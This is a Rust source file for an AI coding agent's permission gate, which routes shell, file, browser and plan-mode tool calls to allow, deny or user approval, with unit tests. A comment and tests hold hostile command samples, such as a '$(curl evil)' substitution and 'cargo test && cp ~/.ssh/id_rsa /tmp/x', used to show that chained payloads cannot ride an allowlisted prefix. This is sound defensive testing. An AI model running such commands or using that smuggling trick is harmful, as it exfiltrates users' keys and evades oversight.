use std::sync::Arc;

use agent_core::domain::{AgentEvent, PermissionOption, PermissionOptionKind, PermissionRequest};
use agent_core::ids::{PermissionRequestId, SessionId, ToolCallId};
use async_channel::Sender;
use serde_json::Value;
use tokio::sync::Mutex;
use tokio_util::sync::CancellationToken;

use crate::loop_state::{Decision, Resolution, RunControl, SessionState};
use crate::mcp::is_mcp_tool;
use crate::safety::{classify_command, CommandRisk};
use crate::tools::{PermissionMode, ToolCtx, ToolExecutor};

#[derive(Clone)]
pub(crate) struct PermissionGate {
    session: Arc<Mutex<SessionState>>,
    control: Arc<Mutex<RunControl>>,
    session_id: SessionId,
    events: Sender<AgentEvent>,
    execution: Option<crate::root_execution::RootExecutionTrace>,
}

pub(crate) enum PermissionOutcome {
    Allowed,
    Denied(String),
    Cancelled,
}

impl PermissionGate {
    pub fn new(
        session: Arc<Mutex<SessionState>>,
        control: Arc<Mutex<RunControl>>,
        session_id: SessionId,
        events: Sender<AgentEvent>,
    ) -> Self {
        Self {
            session,
            control,
            session_id,
            events,
            execution: None,
        }
    }

    pub(crate) fn with_execution(
        mut self,
        execution: crate::root_execution::RootExecutionTrace,
    ) -> Self {
        self.execution = Some(execution);
        self
    }

    pub async fn check(
        &self,
        tool_id: &ToolCallId,
        tool_name: &str,
        exec: &dyn ToolExecutor,
        args: &Value,
        ctx: &ToolCtx,
        signal: &CancellationToken,
    ) -> PermissionOutcome {
        if !exec.mutating() {
            return PermissionOutcome::Allowed;
        }

        // The per-session document workspace is provisioned by Clark and
        // deliberately attached to this sandbox for agent-authored reports,
        // plans, and design docs. Writing there should not prompt like a source
        // edit. Keep an explicit per-tool deny authoritative, though.
        if matches!(tool_name, "write_file" | "edit_file")
            && ctx
                .sandbox
                .is_docs_write(args.get("path").and_then(Value::as_str).unwrap_or(""))
        {
            let explicitly_denied = self
                .session
                .lock()
                .await
                .policy
                .get(tool_name)
                .is_some_and(|mode| *mode == PermissionMode::Deny);
            return if explicitly_denied {
                PermissionOutcome::Denied(format!(
                    "The user denied permission to run `{tool_name}`."
                ))
            } else {
                PermissionOutcome::Allowed
            };
        }

        if tool_name != "propose_plan" && self.session.lock().await.plan_mode {
            if tool_name == "enter_plan_mode" {
                return PermissionOutcome::Denied(
                    "Plan mode is already active — research and call propose_plan when your \
                    plan is ready."
                        .to_string(),
                );
            }
            // Plan mode is a research phase, not a straitjacket: strictly
            // read-only shell (ls, git log, rg…) may still run. The hard floor
            // (Blocked classification + user denylist) is checked first so
            // plan mode never widens what a command could do.
            if tool_name == "bash" {
                let info = gate_info(tool_name, args);
                if let Some(why) = self.hard_refusal(tool_name, &info).await {
                    return PermissionOutcome::Denied(format!(
                        "Refused: {why}. The command was not run."
                    ));
                }
                if crate::safety::is_read_only_command(info.detail.as_deref().unwrap_or("")) {
                    return PermissionOutcome::Allowed;
                }
                return PermissionOutcome::Denied(
                    "Plan mode is active — only read-only commands can run right now, and \
                    this command could change something. Research with read-only tools, then \
                    call propose_plan."
                        .to_string(),
                );
            }
            return PermissionOutcome::Denied(
                "Plan mode is active — read-only until your plan is approved. Research more, \
                then call propose_plan."
                    .to_string(),
            );
        }

        let mut info = gate_info(tool_name, args);
        if let Some(diff) = exec.preview(args, ctx) {
            info.detail = Some(diff);
        }

        if let Some(why) = self.hard_refusal(tool_name, &info).await {
            return PermissionOutcome::Denied(format!("Refused: {why}. The command was not run."));
        }

        if self.command_preapproved(tool_name, &info).await {
            return PermissionOutcome::Allowed;
        }

        // A plan decision (proposing one, or entering plan mode) must always
        // get an explicit human answer, in every permission mode — never
        // auto-allowed/denied by the session policy.
        let is_plan_gate = matches!(tool_name, "propose_plan" | "enter_plan_mode");
        let mode = if is_plan_gate {
            PermissionMode::Ask
        } else {
            let s = self.session.lock().await;
            s.policy
                .get(tool_name)
                .copied()
                .unwrap_or(PermissionMode::Ask)
        };
        let (approved, feedback) = match mode {
            PermissionMode::Allow => (true, None),
            PermissionMode::Deny => (false, None),
            PermissionMode::Ask => {
                match self.ask_permission(tool_id, tool_name, &info, signal).await {
                    Some(resolution) => {
                        // Plan gates never write policy: "always allow plans"
                        // is not a grant the options offer or the gate honors.
                        if !is_plan_gate {
                            self.apply_policy(tool_name, &info, resolution.decision)
                                .await;
                        }
                        (resolution.decision.approved(), resolution.feedback)
                    }
                    None => return PermissionOutcome::Cancelled,
                }
            }
        };

        if is_plan_gate && approved {
            let mut s = self.session.lock().await;
            if tool_name == "propose_plan" {
                s.plan_mode = false;
                // Queue the one-shot "plan mode is off" note for the next turn.
                s.plan_exited = true;
            } else {
                s.plan_mode = true;
                s.plan_exited = false;
            }
        }

        if approved {
            PermissionOutcome::Allowed
        } else if tool_name == "propose_plan" {
            PermissionOutcome::Denied(match feedback {
                Some(feedback) => format!(
                    "The user reviewed your plan and isn't ready to approve it. Their \
                    feedback:\n\n{feedback}\n\nStay in plan mode: address the feedback — \
                    research more if needed — then call propose_plan again with the updated \
                    plan."
                ),
                None => "The user isn't ready to approve this plan yet — keep researching or \
                    refine the plan, then call propose_plan again."
                    .to_string(),
            })
        } else if tool_name == "enter_plan_mode" {
            PermissionOutcome::Denied(
                "The user wants you to proceed directly — skip the planning phase and build \
                it, asking questions as needed."
                    .to_string(),
            )
        } else {
            PermissionOutcome::Denied(format!("The user denied permission to run `{tool_name}`."))
        }
    }

    /// Whether Plan Mode is currently active for this session.
    pub(crate) async fn plan_mode_active(&self) -> bool {
        self.session.lock().await.plan_mode
    }

    async fn ask_permission(
        &self,
        tool_id: &ToolCallId,
        tool_name: &str,
        info: &GateInfo,
        signal: &CancellationToken,
    ) -> Option<Resolution> {
        if let Some(execution) = &self.execution {
            execution.transition(
                agent_orchestration::ExecutionState::AwaitingInput,
                Some(format!("permission requested for {tool_name}")),
            );
        }
        let request_id = PermissionRequestId::new(format!("perm-{}", tool_id.as_str()));
        let (responder, rx) = tokio::sync::oneshot::channel();
        {
            let mut control = self.control.lock().await;
            control.arm(request_id.clone(), responder);
        }

        let _ = self
            .events
            .send(AgentEvent::PermissionRequest {
                request: PermissionRequest {
                    id: request_id,
                    session: self.session_id.clone(),
                    tool_call: Some(tool_id.clone()),
                    title: permission_title(tool_name),
                    options: permission_options(tool_name),
                    detail: info.detail.clone(),
                    risk: if tool_name == "propose_plan" {
                        Some("plan".to_string())
                    } else if tool_name == "enter_plan_mode" {
                        Some("plan_entry".to_string())
                    } else if info.external {
                        Some("external".to_string())
                    } else {
                        info.risk.map(|r| r.as_str().to_string())
                    },
                    reason: info.reason.clone(),
                },
            })
            .await;

        let resolution = tokio::select! {
            _ = signal.cancelled() => None,
            r = rx => r.ok(),
        };
        if let Some(execution) = &self.execution {
            execution.transition(
                agent_orchestration::ExecutionState::Running,
                Some("permission wait resolved".to_string()),
            );
        }
        if resolution.is_none() {
            self.control.lock().await.clear();
        }
        resolution
    }

    async fn hard_refusal(&self, name: &str, info: &GateInfo) -> Option<String> {
        if name != "bash" {
            return None;
        }
        if matches!(info.risk, Some(CommandRisk::Blocked)) {
            return Some(
                info.reason
                    .clone()
                    .unwrap_or_else(|| "blocked for safety".to_string()),
            );
        }
        let cmd = info.detail.clone().unwrap_or_default();
        let s = self.session.lock().await;
        s.deny_commands
            .iter()
            .any(|d| prefix_match(&cmd, d))
            .then(|| "on your command denylist".to_string())
    }

    async fn command_preapproved(&self, name: &str, info: &GateInfo) -> bool {
        if name != "bash"
            || !matches!(
                info.risk,
                Some(CommandRisk::Safe) | Some(CommandRisk::Caution)
            )
        {
            return false;
        }
        let cmd = info.detail.clone().unwrap_or_default();
        // Never preapprove command substitution: it can't be split into segments,
        // so an allowlisted prefix (`cargo test`) would otherwise carry a hidden
        // `$(curl evil)` / backtick payload straight past the gate.
        if cmd.contains("$(") || cmd.contains('`') {
            return false;
        }
        // Match the allowlist PER SEGMENT, not against the whole raw line: an
        // "always allow `cargo test`" grant must not silently run
        // `cargo test && cp ~/.ssh/id_rsa /tmp` just because the line starts with
        // the trusted prefix. Every segment must be individually trusted — either
        // allowlisted by prefix, or inherently Safe (so `cargo test | tee log`
        // still preapproves).
        let segments = crate::safety::split_segments(&cmd);
        if segments.is_empty() {
            return false;
        }
        let s = self.session.lock().await;
        segments.iter().all(|seg| {
            classify_command(seg).risk == CommandRisk::Safe
                || s.allow_commands.iter().any(|a| prefix_match(seg, a))
        })
    }

    async fn apply_policy(&self, tool: &str, info: &GateInfo, decision: Decision) {
        let mut s = self.session.lock().await;
        match decision {
            Decision::AllowAlways => {
                if tool == "bash" {
                    if let Some(cmd) = info.detail.as_deref() {
                        let entry = cmd.trim().to_string();
                        if !entry.is_empty() && !s.allow_commands.contains(&entry) {
                            s.allow_commands.push(entry);
                        }
                    }
                } else {
                    s.policy.insert(tool.to_string(), PermissionMode::Allow);
                }
            }
            Decision::RejectAlways => {
                s.policy.insert(tool.to_string(), PermissionMode::Deny);
            }
            _ => {}
        }
    }
}

struct GateInfo {
    detail: Option<String>,
    risk: Option<CommandRisk>,
    reason: Option<String>,
    external: bool,
}

fn gate_info(name: &str, args: &Value) -> GateInfo {
    if is_mcp_tool(name) {
        let pretty = serde_json::to_string_pretty(args).unwrap_or_else(|_| args.to_string());
        return GateInfo {
            detail: Some(format!("{name}\n{pretty}")),
            risk: None,
            reason: Some("external MCP tool - review its inputs".to_string()),
            external: true,
        };
    }
    match name {
        "bash" => {
            let cmd = args
                .get("command")
                .and_then(Value::as_str)
                .unwrap_or("")
                .trim()
                .to_string();
            let c = classify_command(&cmd);
            GateInfo {
                detail: Some(cmd),
                risk: Some(c.risk),
                reason: c.reason,
                external: false,
            }
        }
        "write_file" | "edit_file" => GateInfo {
            detail: args.get("path").and_then(Value::as_str).map(str::to_string),
            risk: None,
            reason: None,
            external: false,
        },
        "propose_plan" => GateInfo {
            detail: args.get("plan").and_then(Value::as_str).map(str::to_string),
            risk: None,
            reason: None,
            external: false,
        },
        "enter_plan_mode" => GateInfo {
            detail: args
                .get("reason")
                .and_then(Value::as_str)
                .map(str::to_string),
            risk: None,
            reason: None,
            external: false,
        },
        // MCP-tool posture, not `clark_research`'s zero-gate one: it drives a
        // real browser against live sites under arbitrary session state, a
        // much larger blast radius than a bounded server-side call — `external:
        // true` keeps it out of "auto" mode's default-safe auto-approval.
        "browser" => {
            let pretty = serde_json::to_string_pretty(args).unwrap_or_else(|_| args.to_string());
            GateInfo {
                detail: Some(pretty),
                risk: None,
                reason: Some("experimental browser tool - review its action".to_string()),
                external: true,
            }
        }
        _ => GateInfo {
            detail: None,
            risk: None,
            reason: None,
            external: false,
        },
    }
}

fn prefix_match(cmd: &str, entry: &str) -> bool {
    let cmd = cmd.trim();
    let entry = entry.trim();
    !entry.is_empty() && (cmd == entry || cmd.starts_with(&format!("{entry} ")))
}

fn permission_title(tool: &str) -> String {
    match tool {
        "bash" => "Run a shell command?".to_string(),
        "edit_file" => "Apply this edit?".to_string(),
        "write_file" => "Write this file?".to_string(),
        "propose_plan" => "Ready to build?".to_string(),
        "enter_plan_mode" => "Start with a plan?".to_string(),
        "browser" => "Run this browser action?".to_string(),
        t if is_mcp_tool(t) => "Run an MCP tool?".to_string(),
        other => format!("Allow `{other}` to run?"),
    }
}

fn permission_options(tool: &str) -> Vec<PermissionOption> {
    if tool == "propose_plan" {
        // Both approvals proceed; they differ in the permission mode the app
        // switches to afterwards (run autonomously vs. review each step).
        return vec![
            PermissionOption {
                id: "approve_auto".into(),
                label: "Approve — run it for me".into(),
                kind: PermissionOptionKind::AllowOnce,
            },
            PermissionOption {
                id: "approve_review".into(),
                label: "Approve — check each step with me".into(),
                kind: PermissionOptionKind::AllowOnce,
            },
            PermissionOption {
                id: "reject_once".into(),
                label: "Keep planning".into(),
                kind: PermissionOptionKind::RejectOnce,
            },
        ];
    }
    if tool == "enter_plan_mode" {
        return vec![
            PermissionOption {
                id: "allow_once".into(),
                label: "Yes, plan first".into(),
                kind: PermissionOptionKind::AllowOnce,
            },
            PermissionOption {
                id: "reject_once".into(),
                label: "No, just build".into(),
                kind: PermissionOptionKind::RejectOnce,
            },
        ];
    }
    let always = if tool == "bash" {
        "Always allow this command".to_string()
    } else if is_mcp_tool(tool) {
        "Always allow this tool".to_string()
    } else {
        format!("Always allow {tool}")
    };
    vec![
        PermissionOption {
            id: "allow_once".into(),
            label: "Allow once".into(),
            kind: PermissionOptionKind::AllowOnce,
        },
        PermissionOption {
            id: "allow_always".into(),
            label: always,
            kind: PermissionOptionKind::AllowAlways,
        },
        PermissionOption {
            id: "reject_once".into(),
            label: "Reject".into(),
            kind: PermissionOptionKind::RejectOnce,
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn prefix_matching_keeps_word_boundary() {
        assert!(prefix_match("cargo test --lib", "cargo test"));
        assert!(prefix_match("cargo test", "cargo test"));
        assert!(!prefix_match("cargo testfoo", "cargo test"));
    }

    #[test]
    fn tool_titles_are_user_facing() {
        assert_eq!(permission_title("bash"), "Run a shell command?");
        assert_eq!(permission_title("write_file"), "Write this file?");
        assert_eq!(permission_title("propose_plan"), "Ready to build?");
        assert_eq!(permission_title("enter_plan_mode"), "Start with a plan?");
        assert_eq!(permission_title("browser"), "Run this browser action?");
    }

    #[test]
    fn browser_gate_info_is_marked_external_like_mcp_tools() {
        let info = gate_info(
            "browser",
            &serde_json::json!({"action": "navigate", "url": "https://x"}),
        );
        assert!(info.external);
        assert!(info.detail.unwrap().contains("navigate"));
    }

    struct FakeMutating;

    #[async_trait::async_trait]
    impl ToolExecutor for FakeMutating {
        fn name(&self) -> &str {
            "fake_mutate"
        }
        fn description(&self) -> &str {
            "test tool"
        }
        fn parameters(&self) -> Value {
            serde_json::json!({})
        }
        fn kind(&self) -> agent_core::domain::ToolKind {
            agent_core::domain::ToolKind::Other
        }
        fn mutating(&self) -> bool {
            true
        }
        async fn invoke(&self, _args: Value, _ctx: &ToolCtx) -> crate::tools::ToolOutcome {
            crate::tools::ToolOutcome::ok("done")
        }
    }

    fn test_ctx(dir: &std::path::Path) -> ToolCtx {
        ToolCtx {
            sandbox: Arc::new(crate::sandbox::Sandbox::new(dir).unwrap()),
            executor: Arc::new(crate::exec::LocalExecutor),
            reads: Arc::new(std::sync::Mutex::new(crate::tools::ReadTracker::default())),
            cancel: CancellationToken::new(),
            background: Arc::new(crate::background::BackgroundTasks::default()),
            session: Arc::new(tokio::sync::Mutex::new(SessionState::default())),
            progress: None,
            agent_progress: None,
        }
    }

    #[tokio::test]
    async fn plan_mode_denies_mutating_tools_except_propose_plan() {
        let dir = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState {
            plan_mode: true,
            ..Default::default()
        }));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, _rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session, control, SessionId::new("s1"), tx);
        let ctx = test_ctx(dir.path());
        let outcome = gate
            .check(
                &ToolCallId::new("t1"),
                "fake_mutate",
                &FakeMutating,
                &serde_json::json!({}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;
        assert!(matches!(outcome, PermissionOutcome::Denied(_)));
    }

    #[tokio::test]
    async fn document_workspace_writes_are_allowed_without_prompt_in_plan_mode() {
        let project = tempfile::tempdir().unwrap();
        let docs = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState {
            plan_mode: true,
            ..Default::default()
        }));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session, control, SessionId::new("s1"), tx);
        let mut ctx = test_ctx(project.path());
        ctx.sandbox = Arc::new(
            crate::sandbox::Sandbox::new(project.path())
                .unwrap()
                .with_docs(docs.path().to_path_buf()),
        );
        let target = ctx.sandbox.docs_root().unwrap().join("design.md");

        let outcome = gate
            .check(
                &ToolCallId::new("t1"),
                "write_file",
                &FakeMutating,
                &serde_json::json!({"path": target}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;

        assert!(matches!(outcome, PermissionOutcome::Allowed));
        assert!(rx.is_empty(), "trusted workspace write must not prompt");
    }

    #[tokio::test]
    async fn explicit_write_deny_still_applies_to_document_workspace() {
        let project = tempfile::tempdir().unwrap();
        let docs = tempfile::tempdir().unwrap();
        let mut state = SessionState::default();
        state
            .policy
            .insert("write_file".to_string(), PermissionMode::Deny);
        let session = Arc::new(Mutex::new(state));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, _rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session, control, SessionId::new("s1"), tx);
        let mut ctx = test_ctx(project.path());
        ctx.sandbox = Arc::new(
            crate::sandbox::Sandbox::new(project.path())
                .unwrap()
                .with_docs(docs.path().to_path_buf()),
        );
        let target = ctx.sandbox.docs_root().unwrap().join("design.md");

        let outcome = gate
            .check(
                &ToolCallId::new("t1"),
                "write_file",
                &FakeMutating,
                &serde_json::json!({"path": target}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;

        assert!(matches!(outcome, PermissionOutcome::Denied(_)));
    }

    #[tokio::test]
    async fn propose_plan_always_asks_and_clears_plan_mode_on_approval() {
        let dir = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState {
            plan_mode: true,
            ..Default::default()
        }));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session.clone(), control.clone(), SessionId::new("s1"), tx);
        let ctx = test_ctx(dir.path());

        let check = tokio::spawn(async move {
            gate.check(
                &ToolCallId::new("t1"),
                "propose_plan",
                &FakeMutating,
                &serde_json::json!({"plan": "do the thing"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await
        });

        let event = rx.recv().await.unwrap();
        let AgentEvent::PermissionRequest { request } = event else {
            panic!("expected a permission request");
        };
        assert_eq!(request.risk.as_deref(), Some("plan"));
        // The plan gate offers the two approval flavors plus "keep planning".
        assert_eq!(
            request
                .options
                .iter()
                .map(|o| o.id.as_str())
                .collect::<Vec<_>>(),
            vec!["approve_auto", "approve_review", "reject_once"]
        );
        control
            .lock()
            .await
            .resolve(&request.id, Decision::AllowOnce.into());

        let outcome = check.await.unwrap();
        assert!(matches!(outcome, PermissionOutcome::Allowed));
        let s = session.lock().await;
        assert!(!s.plan_mode);
        assert!(s.plan_exited, "approval queues the one-shot exit note");
    }

    #[tokio::test]
    async fn propose_plan_rejection_keeps_plan_mode_active() {
        let dir = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState {
            plan_mode: true,
            ..Default::default()
        }));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session.clone(), control.clone(), SessionId::new("s1"), tx);
        let ctx = test_ctx(dir.path());

        let check = tokio::spawn(async move {
            gate.check(
                &ToolCallId::new("t1"),
                "propose_plan",
                &FakeMutating,
                &serde_json::json!({"plan": "do the thing"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await
        });

        let event = rx.recv().await.unwrap();
        let AgentEvent::PermissionRequest { request } = event else {
            panic!("expected a permission request");
        };
        control.lock().await.resolve(
            &request.id,
            Resolution {
                decision: Decision::RejectOnce,
                feedback: Some("add tests for the login flow".to_string()),
            },
        );

        let outcome = check.await.unwrap();
        let PermissionOutcome::Denied(message) = outcome else {
            panic!("expected a denial");
        };
        assert!(
            message.contains("add tests for the login flow"),
            "the user's feedback must reach the model as the rejection reason: {message}"
        );
        assert!(session.lock().await.plan_mode);
    }

    fn bash_gate(cmd: &str) -> GateInfo {
        gate_info("bash", &serde_json::json!({ "command": cmd }))
    }

    #[allow(clippy::type_complexity)] // test fixture tuple, destructured at every call site
    fn plan_mode_gate(
        state: SessionState,
    ) -> (
        PermissionGate,
        Arc<Mutex<SessionState>>,
        Arc<Mutex<RunControl>>,
        async_channel::Receiver<AgentEvent>,
    ) {
        let session = Arc::new(Mutex::new(state));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session.clone(), control.clone(), SessionId::new("s1"), tx);
        (gate, session, control, rx)
    }

    #[tokio::test]
    async fn plan_mode_allows_readonly_bash_and_denies_the_rest() {
        let dir = tempfile::tempdir().unwrap();
        let (gate, _session, _control, rx) = plan_mode_gate(SessionState {
            plan_mode: true,
            ..Default::default()
        });
        let ctx = test_ctx(dir.path());

        let readonly = gate
            .check(
                &ToolCallId::new("t1"),
                "bash",
                &FakeMutating,
                &serde_json::json!({"command": "git status && rg propose_plan | head"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;
        assert!(matches!(readonly, PermissionOutcome::Allowed));
        assert!(rx.is_empty(), "read-only research must not prompt");

        let mutating = gate
            .check(
                &ToolCallId::new("t2"),
                "bash",
                &FakeMutating,
                &serde_json::json!({"command": "touch src/new.rs"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;
        let PermissionOutcome::Denied(message) = mutating else {
            panic!("a mutating command must be denied in plan mode");
        };
        assert!(message.contains("Plan mode is active"));
        assert!(message.contains("propose_plan"));
    }

    #[tokio::test]
    async fn plan_mode_keeps_the_hard_floor_for_bash() {
        let dir = tempfile::tempdir().unwrap();
        let (gate, _session, _control, _rx) = plan_mode_gate(SessionState {
            plan_mode: true,
            deny_commands: vec!["git log".to_string()],
            ..Default::default()
        });
        let ctx = test_ctx(dir.path());

        // Read-only but user-denylisted → still refused.
        let denylisted = gate
            .check(
                &ToolCallId::new("t1"),
                "bash",
                &FakeMutating,
                &serde_json::json!({"command": "git log"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;
        let PermissionOutcome::Denied(message) = denylisted else {
            panic!("denylisted command must be refused");
        };
        assert!(message.contains("denylist"));
    }

    #[tokio::test]
    async fn enter_plan_mode_asks_then_flips_plan_mode_on_approval() {
        let dir = tempfile::tempdir().unwrap();
        let (gate, session, control, rx) = plan_mode_gate(SessionState::default());
        let ctx = test_ctx(dir.path());

        let check = tokio::spawn(async move {
            gate.check(
                &ToolCallId::new("t1"),
                "enter_plan_mode",
                &FakeMutating,
                &serde_json::json!({"reason": "touches several files"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await
        });

        let event = rx.recv().await.unwrap();
        let AgentEvent::PermissionRequest { request } = event else {
            panic!("expected a permission request");
        };
        assert_eq!(request.risk.as_deref(), Some("plan_entry"));
        assert_eq!(request.title, "Start with a plan?");
        assert_eq!(request.detail.as_deref(), Some("touches several files"));
        assert_eq!(
            request
                .options
                .iter()
                .map(|o| o.id.as_str())
                .collect::<Vec<_>>(),
            vec!["allow_once", "reject_once"]
        );
        control
            .lock()
            .await
            .resolve(&request.id, Decision::AllowOnce.into());

        let outcome = check.await.unwrap();
        assert!(matches!(outcome, PermissionOutcome::Allowed));
        let s = session.lock().await;
        assert!(s.plan_mode);
        assert!(!s.plan_exited);
    }

    #[tokio::test]
    async fn enter_plan_mode_rejection_tells_the_model_to_proceed() {
        let dir = tempfile::tempdir().unwrap();
        let (gate, session, control, rx) = plan_mode_gate(SessionState::default());
        let ctx = test_ctx(dir.path());

        let check = tokio::spawn(async move {
            gate.check(
                &ToolCallId::new("t1"),
                "enter_plan_mode",
                &FakeMutating,
                &serde_json::json!({}),
                &ctx,
                &CancellationToken::new(),
            )
            .await
        });

        let event = rx.recv().await.unwrap();
        let AgentEvent::PermissionRequest { request } = event else {
            panic!("expected a permission request");
        };
        control
            .lock()
            .await
            .resolve(&request.id, Decision::RejectOnce.into());

        let outcome = check.await.unwrap();
        let PermissionOutcome::Denied(message) = outcome else {
            panic!("expected a denial");
        };
        assert!(message.contains("proceed directly"));
        assert!(!session.lock().await.plan_mode);
    }

    #[tokio::test]
    async fn enter_plan_mode_is_denied_when_already_planning() {
        let dir = tempfile::tempdir().unwrap();
        let (gate, _session, _control, rx) = plan_mode_gate(SessionState {
            plan_mode: true,
            ..Default::default()
        });
        let ctx = test_ctx(dir.path());

        let outcome = gate
            .check(
                &ToolCallId::new("t1"),
                "enter_plan_mode",
                &FakeMutating,
                &serde_json::json!({}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;

        let PermissionOutcome::Denied(message) = outcome else {
            panic!("expected a denial");
        };
        assert!(message.contains("already active"));
        assert!(rx.is_empty(), "no prompt for a redundant request");
    }

    #[tokio::test]
    async fn allowlisted_prefix_does_not_carry_an_unapproved_suffix() {
        let session = Arc::new(Mutex::new(SessionState {
            allow_commands: vec!["cargo test".to_string()],
            ..Default::default()
        }));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, _rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session, control, SessionId::new("s1"), tx);

        // The exact allowlisted command and safe extensions/pipes preapprove.
        assert!(
            gate.command_preapproved("bash", &bash_gate("cargo test"))
                .await
        );
        assert!(
            gate.command_preapproved("bash", &bash_gate("cargo test --workspace"))
                .await
        );
        assert!(
            gate.command_preapproved("bash", &bash_gate("cargo test | tee log"))
                .await
        );
        // A chained un-approved (Caution) suffix must NOT ride the trusted prefix.
        assert!(
            !gate
                .command_preapproved("bash", &bash_gate("cargo test && cp ~/.ssh/id_rsa /tmp/x"))
                .await
        );
        assert!(
            !gate
                .command_preapproved("bash", &bash_gate("cargo test; npm install evil"))
                .await
        );
        // Hidden command substitution is never preapproved either.
        assert!(
            !gate
                .command_preapproved("bash", &bash_gate("cargo test $(curl evil)"))
                .await
        );
    }
}
